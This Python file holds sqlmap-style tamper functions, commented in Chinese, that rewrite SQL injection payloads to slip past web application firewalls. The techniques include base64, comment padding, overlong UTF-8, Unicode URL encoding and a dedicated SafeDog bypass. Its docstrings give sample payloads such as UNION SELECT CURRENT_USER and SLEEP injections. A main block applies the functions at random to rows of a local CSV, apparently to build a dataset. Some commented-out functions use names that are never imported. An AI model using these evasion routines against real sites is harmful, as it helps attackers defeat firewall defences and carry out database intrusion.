from lib.core.enums import PRIORITY
# from lib.core.settings import UNICODE_ENCODING
import random
import csv
import string
import base64
from lib.core.settings import UNICODE_ENCODING
from lib.core.compat import xrange

__priority__ = PRIORITY.LOW


# base64编码
def tamper1(payload, **kwargs):
    """
    Base64-encodes all characters in a given payload

    >>> tamper("1' AND SLEEP(5)#")
    'MScgQU5EIFNMRUVQKDUpIw=='
    """

    return base64.b64encode(payload.encode(UNICODE_ENCODING)) if payload else payload


# 用加号替换空格
def tamper2(payload, **kwargs):
    """
    Replaces space character (' ') with plus ('+')

    Notes:
        * Is this any useful? The plus get's url-encoded by sqlmap engine invalidating the query afterwards
        * This tamper script works against all databases

    >>> tamper('SELECT id FROM users')
    'SELECT+id+FROM+users'
    """

    retVal = payload

    if payload:
        retVal = ""
        quote, doublequote, firstspace = False, False, False

        for i in xrange(len(payload)):
            if not firstspace:
                if payload[i].isspace():
                    firstspace = True
                    retVal += "+"
                    continue

            elif payload[i] == '\'':
                quote = not quote

            elif payload[i] == '"':
                doublequote = not doublequote

            elif payload[i] == " " and not doublequote and not quote:
                retVal += "+"
                continue

            retVal += payload[i]

    return retVal


# 以区块注释添加空格
def tamper3(payload, **kwargs):
    """
    Replaces space character (' ') with comments '/**/'

    Tested against:
        * Microsoft SQL Server 2005
        * MySQL 4, 5.0 and 5.5
        * Oracle 10g
        * PostgreSQL 8.3, 8.4, 9.0

    Notes:
        * Useful to bypass weak and bespoke web application firewalls

    >>> tamper('SELECT id FROM users')
    'SELECT/**/id/**/FROM/**/users'
    """

    retVal = payload

    if payload:
        retVal = ""
        quote, doublequote, firstspace = False, False, False

        for i in xrange(len(payload)):
            if not firstspace:
                if payload[i].isspace():
                    firstspace = True
                    retVal += "/**/"
                    continue

            elif payload[i] == '\'':
                quote = not quote

            elif payload[i] == '"':
                doublequote = not doublequote

            elif payload[i] == " " and not doublequote and not quote:
                retVal += "/**/"
                continue

            retVal += payload[i]

    return retVal

# 将字符转换为utf8


def tamper6(payload, **kwargs):
    """
    Converts all (non-alphanum) characters in a given payload to overlong UTF8 (not processing already encoded) (e.g. ' -> %C0%A7)

    Reference:
        * https://www.acunetix.com/vulnerabilities/unicode-transformation-issues/
        * https://www.thecodingforums.com/threads/newbie-question-about-character-encoding-what-does-0xc0-0x8a-have-in-common-with-0xe0-0x80-0x8a.170201/

    >>> tamper('SELECT FIELD FROM TABLE WHERE 2>1')
    'SELECT%C0%A0FIELD%C0%A0FROM%C0%A0TABLE%C0%A0WHERE%C0%A02%C0%BE1'
    """

    retVal = payload

    if payload:
        retVal = ""
        i = 0

        while i < len(payload):
            if payload[i] == '%' and (i < len(payload) - 2) and payload[i + 1:i + 2] in string.hexdigits and payload[i + 2:i + 3] in string.hexdigits:
                retVal += payload[i:i + 3]
                i += 3
            else:
                if payload[i] not in (string.ascii_letters + string.digits):
                    retVal += "%%%.2X%%%.2X" % (
                        0xc0 + (ord(payload[i]) >> 6), 0x80 + (ord(payload[i]) & 0x3f))
                else:
                    retVal += payload[i]
                i += 1

    return retVal

# 过滤单引号


def tamper7(payload, **kwargs):
    """
    Replaces apostrophe character (') with its UTF-8 full width counterpart (e.g. ' -> %EF%BC%87)

    >>> tamper("1 AND '1'='1")
    '1 AND %EF%BC%871%EF%BC%87=%EF%BC%871'
    """

    return payload.replace('\'', "%EF%BC%87") if payload else payload


# URL编码
def tamper8(payload, **kwargs):
    """
    Unicode-URL-encodes all characters in a given payload (not processing already encoded) (e.g. SELECT -> %u0053%u0045%u004C%u0045%u0043%u0054)

    >>> tamper('SELECT FIELD%20FROM TABLE')
    '%u0053%u0045%u004C%u0045%u0043%u0054%u0020%u0046%u0049%u0045%u004C%u0044%u0020%u0046%u0052%u004F%u004D%u0020%u0054%u0041%u0042%u004C%u0045'
    """

    retVal = payload

    if payload:
        retVal = ""
        i = 0

        while i < len(payload):
            if payload[i] == '%' and (i < len(payload) - 2) and payload[i + 1:i + 2] in string.hexdigits and payload[i + 2:i + 3] in string.hexdigits:
                retVal += "%%u00%s" % payload[i + 1:i + 3]
                i += 3
            else:
                retVal += '%%u%.4X' % ord(payload[i])
                i += 1

    return retVal


'''

# 对关键字条件注释
def tamper9(payload, **kwargs):
    """
    Encloses each keyword with (MySQL) versioned comment

    Notes:
        * Useful to bypass several web application firewalls when the
          back-end database management system is MySQL

    >>> tamper('1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,122,114,115,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,115,114,121,58))#')
    '1/*!UNION*//*!ALL*//*!SELECT*//*!NULL*/,/*!NULL*/,/*!CONCAT*/(/*!CHAR*/(58,122,114,115,58),/*!IFNULL*/(CAST(/*!CURRENT_USER*/()/*!AS*//*!CHAR*/),/*!CHAR*/(32)),/*!CHAR*/(58,115,114,121,58))#'
    """

    def process(match):
        word = match.group('word')
        if word.upper() in kb.keywords and word.upper() not in IGNORE_SPACE_AFFECTED_KEYWORDS:
            return match.group().replace(word, "/*!%s*/" % word)
        else:
            return match.group()

    retVal = payload

    if payload:
        retVal = re.sub(r"(?<=\W)(?P<word>[A-Za-z_]+)(?=\W|\Z)", process, retVal)
        retVal = retVal.replace(" /*!", "/*!").replace("*/ ", "*/")

    return retVal
'''
'''
def tamper1(payload):
    if payload:
              pass
              payload = payload.replace("SLEEP(5)","\"0\" LikE Sleep(5)") # 将SLEEP(5)替换成"0" LIKE Sleep(5)，因为Sleep()函数执行后会返回0，0等于0就会返回true
              payload = payload.replace("","/*FFFFFFFFFFFFFFFFFFFFFFFFF*/") # 将空格替换
              p = re.compile(r'(\d+)=')
              payload=p.sub(r"'\1'LikE ", payload) #将数字附近的=替换成LikE
    return payload # 返回payload
'''


def tamper9(payload, **kwargs):
    if payload:
        bypass_SafeDog_str = "/*x^x*/"  # 一个干扰字符
        payload = payload.replace(
            "UNION", bypass_SafeDog_str+"UNION"+bypass_SafeDog_str)  # 在UNION的左右两边添加干扰字符
        payload = payload.replace(
            "SELECT", bypass_SafeDog_str+"SELECT"+bypass_SafeDog_str)  # 同上，
        payload = payload.replace(
            "AND", bypass_SafeDog_str+"AND"+bypass_SafeDog_str)  # 同上，
        payload = payload.replace(
            "=", bypass_SafeDog_str+"="+bypass_SafeDog_str)  # 将空格替换成干扰字符
        payload = payload.replace(" ", bypass_SafeDog_str)
        # 将information_schema.这个关键字替换成URL编码后的内容
        payload = payload.replace(
            "information_schema.", "%20%20/*!%20%20%20%20INFOrMATION_SCHEMa%20%20%20%20*/%20%20/*^x^^x^*/%20/*!.*/%20/*^x^^x^*/")
        payload = payload.replace(
            "FROM", bypass_SafeDog_str+"FROM"+bypass_SafeDog_str)  # 同样替换
        # print "[+]THE PAYLOAD RUNNING...Bypass safe dog 4.0 apache version ."
        print(payload)  # 输出Payload
    return payload  # 返回Payload


'''
def tamper3(payload, **kwargs):
  if payload:
      payload=payload.replace("UNION ALL SELECT","union%23!@%23$%%5e%26%2a()%60~%0a/*!12345select*/")
      payload=payload.replace("UNION SELECT","union%23!@%23$%%5e%26%2a()%60~%0a/*!12345select*/")
      payload=payload.replace(" FROM ","/*!%23!@%23$%%5e%26%2a()%60~%0afrOm*/")
      payload=payload.replace("CONCAT","/*!12345CONCAT*/")
      payload=payload.replace("CAST(","/*!12345CAST(*/")
      payload=payload.replace("CASE","/*!12345CASE*/")
      payload=payload.replace("DATABASE()","database/**/()")
                
  return payload
'''


def tamper5(payload, **kwargs):
    """
    绕过安全狗
    http://safedog.cn/
    >>> tamper('SELECT id FROM users')
    'SELECT/**)*/id/**)*/FROM/**)*/users'
    """

    retVal = payload

    if payload:
        retVal = ""
        quote, doublequote, firstspace = False, False, False

        for i in xrange(len(payload)):
            if not firstspace:
                if payload[i].isspace():
                    firstspace = True
                    retVal += "/**)*/"
                    continue

            elif payload[i] == '\'':
                quote = not quote

            elif payload[i] == '"':
                doublequote = not doublequote

            elif payload[i] == " " and not doublequote and not quote:
                retVal += "/**)*/"
                continue

            retVal += payload[i]

    return retVal


'''

def tamper5(payload, **kwargs):
    """
    Notes:
        * Useful to ThinkPHP
    Replace hex string
    >>> tamper("0x7163646271")
    ==> 'qcdbq'
    >>> tamper(" ")
    ==> '+'
    """
    blanks = '/**/';
    retVal = payload

    if payload:
        retVal = ""
        quote, doublequote, firstspace, end = False, False, False, False
        for i in xrange(len(payload)):
            if not firstspace:
                if payload[i].isspace():
                    firstspace = True
                    retVal += blanks
                    continue
            elif payload[i] == '\'':
                quote = not quote
            elif payload[i] == '"':
                doublequote = not doublequote
            elif payload[i] == '#' or payload[i:i + 3] == '-- ':
                end = True
            elif payload[i] == " " and not doublequote and not quote:
                if end:
                    retVal += blanks[:-1]
                else:
                    retVal += blanks
                continue
            retVal += payload[i]

    retValArray = retVal.split();
    retTmpArray = []  
    p = re.compile(r'(0x\w+)')
    def func(m):
        tmp = m.group(1).replace('0x','')
        tmp = tmp.replace('\\','\\\\')
        return '\'%s\'' % binascii.a2b_hex(tmp)  

    for val in retValArray:
        retTmpArray.append(p.sub(func,val).replace(' ',blanks))
        
    return " ".join(retTmpArray)


def tamper6(payload, **kwargs):
    """
    Encloses each keyword with versioned MySQL comment
        * Useful to bypass several web application firewalls when the
          back-end database management system is MySQL
    >>> tamper('1 UNION ALL SELECT NULL, NULL, CONCAT(CHAR(58,122,114,115,58),IFNULL(CAST(CURRENT_USER() AS CHAR),CHAR(32)),CHAR(58,115,114,121,58))#')
    '1/*!00000/*|-sdfsdfadfadfdfasdf^^^^^^^-|*/UNION%0a/*!/**/ALL*//*!/*|-sdfsdfadfadfdfasdf^^^^^^^-|*/SELECT%0a*//*!/**/NULL*/,/*!/**/NULL*/,/*!/**/CONCAT*/(/*!/**/CHAR*/(58,122,114,115,58),/*!/**/IFNULL*/(CAST(/*!/**/CURRENT_USER*/()/*!/**/AS*//*!/**/CHAR*/),/*!/**/CHAR*/(32)),/*!/**/CHAR*/(58,115,114,121,58))#'
    """

    def process(match):
        word = match.group('word')
        if word.upper() in kb.keywords and word.upper() not in IGNORE_SPACE_AFFECTED_KEYWORDS:
            if word == u"UNION":
                return match.group().replace(word, "/*!00000/*|-sdfsdfadfadfdfasdf^^^^^^^-|*/%s" % word+chr(37)+'0a')
            elif word == u"SELECT":
                return match.group().replace(word, "/*!/*|-sdfsdfadfadfdfasdf^^^^^^^-|*/%s" % word+chr(37)+'0a*/')
            elif word == u"FROM":
                return match.group().replace(word, "/*!00000/*|-^^^-|*/*/"+chr(37)+"0a%s"% word)
            return match.group().replace(word, "/*!/**/%s*/"% word)
        else:
            return match.group()

    retVal = payload

    if payload:
        retVal = re.sub(r"(?<=\W)(?P<word>[A-Za-z_]+)(?=\W|\Z)", lambda match: process(match), retVal)
        retVal = retVal.replace(" /*!", "/*!").replace("*/ ", "*/")

    return retVal


def tamper7(payload, **kwargs):
    """
    Notes:
        * Useful to ThinkPHP
    Replace hex string
    >>> tamper("0x7163646271")
    ==> 'qcdbq'
    >>> tamper(" ")
    ==> '+'
    """
    blanks = '/**/';
    retVal = payload

    if payload:
        retVal = ""
        quote, doublequote, firstspace, end = False, False, False, False
        for i in xrange(len(payload)):
            if not firstspace:
                if payload[i].isspace():
                    firstspace = True
                    retVal += blanks
                    continue
            elif payload[i] == '\'':
                quote = not quote
            elif payload[i] == '"':
                doublequote = not doublequote
            elif payload[i] == '#' or payload[i:i + 3] == '-- ':
                end = True
            elif payload[i] == " " and not doublequote and not quote:
                if end:
                    retVal += blanks[:-1]
                else:
                    retVal += blanks
                continue
            retVal += payload[i]

    retValArray = retVal.split();
    retTmpArray = []  
    p = re.compile(r'(0x\w+)')
    def func(m):
        tmp = m.group(1).replace('0x','')
        tmp = tmp.replace('\\','\\\\')
        return '\'%s\'' % binascii.a2b_hex(tmp)  

    for val in retValArray:
        retTmpArray.append(p.sub(func,val).replace(' ',blanks))
        
    return " ".join(retTmpArray)

'''


def tamper4(payload, **kwargs):
    """
    IIS Unicode-url-encodes
    WideChar To MultiByte bypass weak web application firewalls
    Reference:
        * http://blog.sina.com.cn/s/blog_85e506df0102vo9s.html
    Notes:
        * Useful to bypass weak web application firewalls
    tamper('SELECT FIELD%20FROM TABLE')
        'S%u00F0L%u00F0C%u00DE FI%u00F0L%u00D0%20FR%u00BAM %u00DE%u00AABL%u00F0'
    """

    change_char = {'1': 'B9', '2': 'B2', '3': 'B3', 'D': 'D0',
                   'T': 'DE', 'Y': 'DD', 'a': 'AA', 'e': 'F0',
                   'o': 'BA', 't': 'FE', 'y': 'FD', '|': 'A6',
                   'd': 'D0', 'A': 'AA', 'E': 'F0', 'O': 'BA'}

    ret_val = payload

    if payload:
        ret_val = ""
        i = 0
        while i < len(payload):
            if payload[i] in change_char.keys():
                ret_val += "%%u00%s" % change_char.get(payload[i])
            else:
                ret_val += payload[i]
            i += 1

    return ret_val


'''

'''


if __name__ == "__main__":
    datas = csv.reader(
        open("C:\\Users\\Lu\\Downloads\\My\\result\\test.csv", 'r'))
    f = open("C:\\Users\\Lu\\Downloads\\My\\result\\testtest.csv", 'w')
    writer = csv.writer(f)

    for data in datas:
        chr_data = str(data)
        i = random.randint(1, 9)

        if i == 1:
            a = tamper1(chr_data)
            writer.writerow(a)
            print(a)
        elif i == 2:
            a = tamper2(chr_data)
            writer.writerow(a)
            print(a)
        elif i == 3:
            a = tamper3(chr_data)
            writer.writerow(a)
            print(a)
        elif i == 4:
            a = tamper4(chr_data)
            writer.writerow(a)
            print(a)
        elif i == 5:
            a = tamper5(chr_data)
            writer.writerow(a)
            print(a)
        elif i == 6:
            a = tamper6(chr_data)
            writer.writerow(a)
            print(a)
        elif i == 7:
            a = tamper7(chr_data)
            writer.writerow(a)
            print(a)
        elif i == 8:
            a = tamper8(chr_data)
            writer.writerow(a)
            print(a)
        else:
            a = tamper9(chr_data)
            writer.writerow(a)
            print(a)
